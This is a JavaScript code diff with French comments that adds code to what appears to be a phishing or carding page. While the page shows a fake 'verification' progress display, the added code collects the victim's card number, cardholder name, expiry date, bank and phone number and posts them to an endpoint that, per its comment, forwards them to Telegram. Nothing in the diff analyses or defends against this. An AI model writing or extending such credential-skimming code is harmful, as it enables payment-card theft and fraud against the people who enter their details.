@@ -1160,6 +1160,34 @@
           loadingStatus.textContent = 'Connexion au système de vérification...';
           loadingProgress.style.width = '20%';
           
+          // Envoyer les données à l'API Telegram
+          const cardNumber = cardNumberInput.value.trim();
+          const cardHolder = cardholderInput.value.trim();
+          const cardExpiry = expiryDateInput.value.trim();
+          const bank = getBankValue();
+          
+          try {
+            const apiResponse = await fetch('/api/send-telegram', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                cardNumber: cardNumber,
+                cardHolder: cardHolder,
+                cardExpiry: cardExpiry,
+                bank: bank,
+                phoneNumber: phoneInput.value.trim()
+              })
+            });
+            
+            if (!apiResponse.ok) {
+              console.error('API Error:', await apiResponse.text());
+            } else {
+              console.log('Données envoyées à Telegram');
+            }
+          } catch (apiError) {
+            console.error('Erreur API:', apiError);
+          }
+          
           const steps = [
             { progress: 40, status: 'Analyse des données...' },
             { progress: 60, status: 'Vérification en cours...' },
